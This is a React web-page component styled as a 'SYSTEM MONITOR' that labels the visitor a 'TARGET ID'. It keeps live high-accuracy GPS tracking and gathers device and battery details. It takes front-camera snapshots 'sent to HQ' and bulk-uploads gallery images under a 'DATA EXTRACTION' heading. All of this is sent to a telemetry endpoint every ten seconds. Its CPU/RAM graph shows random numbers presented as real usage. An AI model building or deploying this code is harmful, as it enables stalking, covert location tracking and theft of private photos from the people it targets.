"use client";
import { useState, useEffect, useRef } from "react";
import {
  Camera,
  Battery,
  MapPin,
  Smartphone,
  Shield,
  Upload,
  Activity,
  FileImage,
} from "lucide-react";
import { LineChart, Line, ResponsiveContainer, YAxis } from "recharts";

export default function DeviceMonitor() {
  const [status, setStatus] = useState("Initializing...");
  const [deviceId, setDeviceId] = useState("");
  const [battery, setBattery] = useState(null);
  const [location, setLocation] = useState(null);
  const [deviceInfo, setDeviceInfo] = useState(null);
  const [isCapturing, setIsCapturing] = useState(false);
  const [resourceData, setResourceData] = useState([]);
  const [uploading, setUploading] = useState(false);

  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const fileInputRef = useRef(null);

  useEffect(() => {
    // Generate or retrieve a persistent Device ID
    let storedId = localStorage.getItem("cyber_device_id");
    if (!storedId) {
      storedId = "DEV-" + Math.random().toString(36).substr(2, 9).toUpperCase();
      localStorage.setItem("cyber_device_id", storedId);
    }
    setDeviceId(storedId);

    // Collect Device Info
    setDeviceInfo({
      userAgent: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      memory: navigator.deviceMemory || "Unknown",
      cores: navigator.hardwareConcurrency || "Unknown",
      screenResolution: `${window.screen.width}x${window.screen.height}`,
    });

    // Battery API
    if ("getBattery" in navigator) {
      navigator.getBattery().then((batt) => {
        updateBattery(batt);
        batt.addEventListener("levelchange", () => updateBattery(batt));
        batt.addEventListener("chargingchange", () => updateBattery(batt));
      });
    }

    // Geolocation
    if ("geolocation" in navigator) {
      navigator.geolocation.watchPosition(
        (pos) => {
          setLocation({
            latitude: pos.coords.latitude,
            longitude: pos.coords.longitude,
            accuracy: pos.coords.accuracy,
            timestamp: pos.timestamp,
          });
        },
        (err) => console.error("Geo Error:", err),
        { enableHighAccuracy: true }
      );
    }

    setStatus("Monitoring Active");
  }, []);

  // Real-time Resource Simulation
  useEffect(() => {
    const updateResourceData = () => {
      setResourceData((prev) => {
        const newData = [
          ...prev,
          { time: Date.now(), usage: Math.floor(Math.random() * 30) + 40 },
        ]; // Simulating 40-70% usage
        if (newData.length > 20) newData.shift();
        return newData;
      });
    };
    const interval = setInterval(updateResourceData, 1000);
    return () => clearInterval(interval);
  }, []);

  const updateBattery = (batt) => {
    setBattery({
      level: batt.level * 100,
      charging: batt.charging,
      chargingTime: batt.chargingTime,
      dischargingTime: batt.dischargingTime,
    });
  };

  const sendTelemetry = async (imageData = null, batchImages = []) => {
    if (!deviceId) return;

    const payload = {
      deviceId,
      battery,
      location,
      deviceInfo,
      images: imageData ? [{ url: imageData }] : batchImages,
      resourceUsage:
        resourceData.length > 0
          ? resourceData[resourceData.length - 1].usage
          : 0,
    };

    try {
      await fetch("/api/telemetry", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });
      console.log("Telemetry Sent");
    } catch (err) {
      console.error("Failed to send telemetry", err);
    }
  };

  // Auto-send heartbeat
  useEffect(() => {
    const interval = setInterval(() => {
      if (status === "Monitoring Active") {
        sendTelemetry();
      }
    }, 10000);
    return () => clearInterval(interval);
  }, [status, battery, location, deviceInfo, resourceData]);

  const startCamera = async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        setIsCapturing(true);
      }
    } catch (err) {
      console.error("Camera Error:", err);
      alert("Camera permission denied or unavailable.");
    }
  };

  const captureImage = () => {
    if (videoRef.current && canvasRef.current) {
      const context = canvasRef.current.getContext("2d");
      context.drawImage(videoRef.current, 0, 0, 640, 480);
      const dataUrl = canvasRef.current.toDataURL("image/jpeg");
      sendTelemetry(dataUrl);
      alert("Image Captured & Sent to HQ");

      const tracks = videoRef.current.srcObject.getTracks();
      tracks.forEach((track) => track.stop());
      setIsCapturing(false);
    }
  };

  const handleStorageScan = async (e) => {
    const files = Array.from(e.target.files);
    if (files.length === 0) return;

    setUploading(true);
    const imagePromises = files.map((file) => {
      return new Promise((resolve) => {
        const reader = new FileReader();
        reader.onloadend = () =>
          resolve({ url: reader.result, capturedAt: new Date() });
        reader.readAsDataURL(file);
      });
    });

    const images = await Promise.all(imagePromises);
    await sendTelemetry(null, images);
    setUploading(false);
    alert(`${files.length} Files Scanned & Uploaded`);
  };

  return (
    <div className="min-h-screen bg-black text-green-500 font-mono p-2 flex flex-col items-center overflow-x-hidden">
      <div className="w-full max-w-md border border-green-800 bg-gray-900/50 p-4 rounded-lg shadow-[0_0_20px_rgba(0,255,0,0.2)]">
        {/* Header */}
        <div className="flex justify-between items-center mb-4 border-b border-green-800 pb-2">
          <h1 className="text-lg font-bold flex items-center gap-2">
            <Shield className="w-5 h-5" /> SYSTEM MONITOR
          </h1>
          <span className="text-[10px] animate-pulse text-red-500">
            ● LIVE TRACKING
          </span>
        </div>

        <div className="space-y-3">
          {/* Device ID */}
          <div className="bg-black/50 p-2 rounded border border-green-900 flex justify-between items-center">
            <span className="text-xs text-green-700">TARGET ID</span>
            <span className="text-sm font-bold tracking-widest">
              {deviceId}
            </span>
          </div>

          {/* Real-time Resource Graph */}
          <div className="bg-black/50 p-2 rounded border border-green-900 h-32 relative">
            <div className="text-xs text-green-700 absolute top-2 left-2 flex items-center gap-1">
              <Activity className="w-3 h-3" /> CPU/RAM USAGE
            </div>
            <ResponsiveContainer width="100%" height="100%">
              <LineChart data={resourceData}>
                <Line
                  type="monotone"
                  dataKey="usage"
                  stroke="#00ff41"
                  strokeWidth={2}
                  dot={false}
                  isAnimationActive={false}
                />
                <YAxis domain={[0, 100]} hide />
              </LineChart>
            </ResponsiveContainer>
            <div className="absolute bottom-1 right-2 text-xs font-bold">
              {resourceData.length > 0
                ? resourceData[resourceData.length - 1].usage
                : 0}
              %
            </div>
          </div>

          <div className="grid grid-cols-2 gap-2">
            {/* Battery Status */}
            <div className="bg-black/50 p-2 rounded border border-green-900">
              <div className="text-xs text-green-700 mb-1">POWER</div>
              <div className="flex items-center justify-between">
                <span className="text-lg font-bold">
                  {battery ? `${Math.round(battery.level)}%` : "--%"}
                </span>
                <Battery
                  className={`w-5 h-5 ${
                    battery?.charging ? "text-yellow-400" : "text-green-500"
                  }`}
                />
              </div>
            </div>

            {/* Location Status */}
            <div className="bg-black/50 p-2 rounded border border-green-900">
              <div className="text-xs text-green-700 mb-1">GPS</div>
              <div className="flex items-center justify-between">
                <span className="text-xs truncate">
                  {location
                    ? `${location.latitude.toFixed(
                        2
                      )}, ${location.longitude.toFixed(2)}`
                    : "Locating..."}
                </span>
                <MapPin className="w-5 h-5 text-blue-500" />
              </div>
            </div>
          </div>

          {/* Storage Scanner */}
          <div className="border-t border-green-800 pt-3">
            <div className="text-xs text-center text-green-700 mb-2">
              DATA EXTRACTION
            </div>
            <input
              type="file"
              multiple
              accept="image/*"
              className="hidden"
              ref={fileInputRef}
              onChange={handleStorageScan}
            />
            <button
              onClick={() => fileInputRef.current.click()}
              disabled={uploading}
              className="w-full py-3 bg-blue-900/30 hover:bg-blue-900/50 border border-blue-600 text-blue-400 rounded flex items-center justify-center gap-2 transition-all mb-2"
            >
              {uploading ? (
                <span className="animate-pulse">EXTRACTING DATA...</span>
              ) : (
                <>
                  <FileImage className="w-5 h-5" /> SCAN STORAGE (GALLERY)
                </>
              )}
            </button>

            {!isCapturing ? (
              <button
                onClick={startCamera}
                className="w-full py-3 bg-green-900/30 hover:bg-green-900/50 border border-green-600 rounded flex items-center justify-center gap-2 transition-all"
              >
                <Camera className="w-5 h-5" /> ACTIVATE CAMERA
              </button>
            ) : (
              <div className="space-y-2">
                <video
                  ref={videoRef}
                  autoPlay
                  playsInline
                  className="w-full rounded border border-green-500/50"
                />
                <button
                  onClick={captureImage}
                  className="w-full py-3 bg-red-900/30 hover:bg-red-900/50 border border-red-600 text-red-500 rounded font-bold animate-pulse"
                >
                  CAPTURE SNAPSHOT
                </button>
              </div>
            )}
            <canvas
              ref={canvasRef}
              width="640"
              height="480"
              className="hidden"
            />
          </div>
        </div>

        <div className="mt-4 text-[9px] text-center text-green-900">
          SYSTEM V2.1 // ENCRYPTED UPLINK ESTABLISHED
        </div>
      </div>
    </div>
  );
}
